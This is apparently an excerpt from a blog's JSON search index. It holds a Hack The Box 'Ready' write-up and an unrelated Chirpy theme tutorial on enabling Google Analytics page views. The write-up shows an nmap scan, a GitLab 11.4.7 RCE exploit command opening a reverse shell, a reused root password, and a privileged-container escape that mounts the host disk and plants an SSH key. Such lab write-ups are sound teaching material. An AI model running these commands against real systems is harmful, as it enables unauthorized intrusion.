    "content": "Ready was a pretty straighforward box to get an initial shell on: We identify that’s it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we’re in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory.Portscansudo nmap -T4 -sC -sV -oA scan -p- 10.129.149.31Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 22:41 EDTNmap scan report for 10.129.149.31Host is up (0.015s latency).Not shown: 65533 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)5080/tcp open  http    nginx| http-robots.txt: 53 disallowed entries (15 shown)| / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit| http-title: Sign in \\xC2\\xB7 GitLab|_Requested resource was http://10.129.149.31:5080/users/sign_in|_http-trane-info: Problem with XML parsing of /evox/aboutGitlabThe webserver on port 5080 runs a Gitlab instance.We have access to create a new account.Once logged in, we see in the projects list there’s a single projet called ready-channel.To check the Gitlab version we go to the Help section and we can see it’s running 11.4.7.A quick search on Exploit-DB shows there’s an authenticated remote code execution vulnerability for this exact version.python3 exploit.py -g http://10.129.149.31 -u snowscan2 -p yolo1234 -l 10.10.14.4 -P 4444Reverse shell connection:PrivescBy running linpeas.sh we find a backup file with some SMTP credentials for the gitlab application.Found /opt/backup/gitlab.rbgitlab_rails['smtp_password'] = \"wW59U!ZKMbG9+*#h\"That password is the same password as the root password for the container so we can privesc locally inside the container.git@gitlab:/opt/backup$ su -l rootsu -l rootPassword: wW59U!ZKMbG9+*#hroot@gitlab:~# There’s a root_pass file in the root of the filesystem but that’s not useful.cat /root_passYG65407Bjqvv9A0a8Tm_7wIf we look at the /opt/backup/docker-compose.yml configuration file, we can see it’s a hint that we’re running in a privileged container:    volumes:      - './srv/gitlab/config:/etc/gitlab'      - './srv/gitlab/logs:/var/log/gitlab'      - './srv/gitlab/data:/var/opt/gitlab'      - './root_pass:/root_pass'    privileged: true    restart: unless-stopped    #mem_limit: 1024mPrivileged containers can access the host’s disk devices so we can just read the root flag after mounting the drive.To get a proper shell in the host OS we can drop our SSH keys in the root’s .ssh directory.root@gitlab:~# mount /dev/sda2 /mntmount /dev/sda2 /mntroot@gitlab:~# echo 'ssh-rsa AAAAB3NzaC1y[...]+HUBS+l32faXPc= snowscan@kali' &gt; /mnt/root/.ssh/authorized_keys[...]$ ssh root@10.129.150.37The authenticity of host '10.129.150.37 (10.129.150.37)' can't be established.ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.129.150.37' (ECDSA) to the list of known hosts.Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)[...]The list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Thu Feb 11 14:28:18 2021root@ready:~# cat root.txtb7f98681505cd39066f67147b103c2b3"
  },
  
  {
    "title": "Enable Google Page Views",
    "url": "/posts/enable-google-pv/",
    "categories": "Blogging, Tutorial",
    "tags": "google analytics, pageviews",
    "date": "2021-01-04 07:32:00 +0800",
    





    
    "snippet": "  The content of this post applies only to Universal Analytics property (UA), not Google Analytics 4 (GA 4). In addition, since UA is about to be deprecated on Jul 1, 2023, the Page Views feature o...",
    "content": "  The content of this post applies only to Universal Analytics property (UA), not Google Analytics 4 (GA 4). In addition, since UA is about to be deprecated on Jul 1, 2023, the Page Views feature of Chirpy will also be deprecated at that time.This post is to enable Page Views on the Chirpy theme based blog that you just built. This requires technical knowledge and it’s recommended to keep the google_analytics.pv.* empty unless you have a good reason. If your website has low traffic, the page views count would discourage you to write more blogs. With that said, let’s start with the setup.Set up Google AnalyticsCreate GA account and propertyFirst, you need to set up your account on Google analytics. While you create your account, you must create your first Property as well.  Head to https://analytics.google.com/ and click on Start Measuring  Enter your desired Account Name and choose the desired checkboxes  Enter your desired Property Name. This is the name of the tracker project that appears on your Google Analytics dashboard  Enter the required information About your business  Hit Create and accept any license popup to set up your Google Analytics account and create your propertyCreate Data StreamWith your property created, you now need to set up Data Stream to track your blog traffic. After you signup, the prompt should automatically take you to create your first Data Stream. If not, follow these steps:  Go to Admin on the left column  Select the desired property from the drop-down on the second column  Click on Data Streams  Add a stream and click on Web  Enter your blog’s URLIt should look like this:Now, click on the new data stream and grab the Measurement ID. It should look something like G-V6XXXXXXXX. Copy this to your _config.yml file:google_analytics:  id: 'G-V6XXXXXXX'   # fill in your Google Analytics ID  # Google Analytics pageviews report settings  pv:    proxy_endpoint:   # fill in the Google Analytics superProxy endpoint of Google App Engine    cache_path:       # the local PV cache data, friendly to visitors from GFW regionWhen you push these changes to your blog, you should start seeing the traffic on your Google Analytics. Play around with the Google Analytics dashboard to get familiar with the options available as it takes like 5 mins to pick up your changes. You should now be able to monitor your traffic in real time.Setup Page ViewsThere is a detailed tutorial available to set up Google Analytics superProxy. But, if you are interested to just quickly get your Chirpy-based blog display page views, follow along. These steps were tested on a Linux machine. If you are running Windows, you can use the Git bash terminal to run Unix-like commands.Setup Google App Engine      Visit https://console.cloud.google.com/appengine        Click on Create Application        Click on Create Project        Enter the name and choose the data center close to you        Select Python language and Standard environment        Enable billing account. Yeah, you have to link your credit card. But, you won’t be billed unless you exceed your free quota. For a simple blog, the free quota is more than sufficient.        Go to your App Engine dashboard on your browser and select API &amp; Services from the left navigation menu        Click on Enable APIs and Services button on the top        Enable the following APIs: Google Analytics API        On the left, Click on OAuth Consent Screen and accept Configure Consent Screen. Select External since your blog is probably hosted for the public. Click on Publish under Publishing Status        Click on Credentials on the left and create a new OAuth Client IDs credential. Make sure to add an entry under Authorized redirect URIs that matches: https://&lt;project-id&gt;.&lt;region&gt;.r.appspot.com/admin/auth        Note down the Your Client ID and Your Client Secret. You’ll need this in the next section.        Download and install the cloud SDK for your platform: https://cloud.google.com/sdk/docs/quickstart        Run the following commands:    [root@bc96abf71ef8 /]# gcloud init~snip~Go to the following link in your browser:    https://accounts.google.com/o/oauth2/auth?response_type=code&amp;client_id=XYZ.apps.googleusercontent.com&amp;redirect_uri=ABCDEFGEnter verification code: &lt;VERIFICATION CODE THAT YOU GET AFTER YOU VISIT AND AUTHENTICATE FROM THE ABOVE LINK&gt;You are logged in as: [blah_blah@gmail.com].Pick cloud project to use:[1] chirpy-test-300716[2] Create a new projectPlease enter numeric choice or text value (must exactly match listitem): 1[root@bc96abf71ef8 /]# gcloud info# Your selected project info should be displayed here      Setup Google Analytics superProxy      Clone the Google Analytics superProxy project on Github: https://github.com/googleanalytics/google-analytics-super-proxy to your local.        Remove the first 2 lines in the src/app.yaml file:    - application: your-project-id- version: 1            In src/config.py, add the OAUTH_CLIENT_ID and OAUTH_CLIENT_SECRET that you gathered from your App Engine Dashboard.        Enter any random key for XSRF_KEY, your config.py should look similar to this    #!/usr/bin/python2.7__author__ = 'pete.frisella@gmail.com (Pete Frisella)'# OAuth 2.0 Client SettingsAUTH_CONFIG = {  'OAUTH_CLIENT_ID': 'YOUR_CLIENT_ID',  'OAUTH_CLIENT_SECRET': 'YOUR_CLIENT_SECRET',  'OAUTH_REDIRECT_URI': '%s%s' % (    'https://chirpy-test-XXXXXX.ue.r.appspot.com',    '/admin/auth'  )}# XSRF SettingsXSRF_KEY = 'OnceUponATimeThereLivedALegend'              You can configure a custom domain instead of https://PROJECT_ID.REGION_ID.r.appspot.com.But, for the sake of keeping it simple, we will be using the Google provided default URL.            From inside the src/ directory, deploy the app    [root@bc96abf71ef8 src]# gcloud app deployServices to deploy:descriptor:      [/tmp/google-analytics-super-proxy/src/app.yaml]source:          [/tmp/google-analytics-super-proxy/src]target project:  [chirpy-test-XXXX]target service:  [default]target version:  [VESRION_NUM]target url:      [https://chirpy-test-XXXX.ue.r.appspot.com]Do you want to continue (Y/n)? YBeginning deployment of service [default]...╔════════════════════════════════════════════════════════════╗╠═ Uploading 1 file to Google Cloud Storage                 ═╣╚════════════════════════════════════════════════════════════╝File upload done.Updating service [default]...done.Setting traffic split for service [default]...done.Deployed service [default] to [https://chirpy-test-XXXX.ue.r.appspot.com]You can stream logs from the command line by running:$ gcloud app logs tail -s defaultTo view your application in the web browser run:$ gcloud app browse            Visit the deployed service. Add a /admin to the end of the URL.        Click on Authorize Users and make sure to add yourself as a managed user.        If you get any errors, please Google it. The errors are self-explanatory and should be easy to fix.  If everything went good, you’ll get this screen:Create Google Analytics QueryHead to https://PROJECT_ID.REGION_ID.r.appspot.com/admin and create a query after verifying the account. GA Core Reporting API query request can be created in Query Explorer.The query parameters are as follows:  start-date: fill in the first day of blog posting  end-date: fill in today (this is a parameter supported by GA Report, which means that it will always end according to the current query date)  metrics: select ga:pageviews  dimensions: select ga:pagePathIn order to reduce the returned results and reduce the network bandwidth, we add custom filtering rules 1:      filters: fill in ga:pagePath=~^/posts/.*/$;ga:pagePath!@=.    Among them, ; means using logical AND to concatenate two rules.    If the site.baseurl is specified, change the first filtering rule to ga:pagePath=~^/BASE_URL/posts/.*/$, where BASE_URL is the value of site.baseurl.  After Run Query, copy the generated contents of API Query URI at the bottom of the page and fill in the Encoded URI for the query of SuperProxy on GAE.After the query is saved on GAE, a Public Endpoint (public access address) will be generated, and we will get the query result in JSON format when accessing it. Finally, click Enable Endpoint in Public Request Endpoint to make the query effective, and click Start Scheduling in Scheduling to start the scheduled task.Configure Chirpy to Display Page ViewOnce all the hard part is done, it is very easy to enable the Page View on Chirpy theme. Your superProxy dashboard should look something like below and you can grab the required values.Update the _config.yml file of Chirpy project with the values from your dashboard, to look similar to the following:google_analytics:  id: 'G-V6XXXXXXX'   # fill in your Google Analytics ID  pv:    proxy_endpoint: 'https://PROJECT_ID.REGION_ID.r.appspot.com/query?id=&lt;ID FROM SUPER PROXY&gt;'    cache_path:       # the local PV cache data, friendly to visitors from GFW regionNow, you should see the Page View enabled on your blog.Reference            Google Analytics Core Reporting API: Filters &#8617;      "
  }
  
]

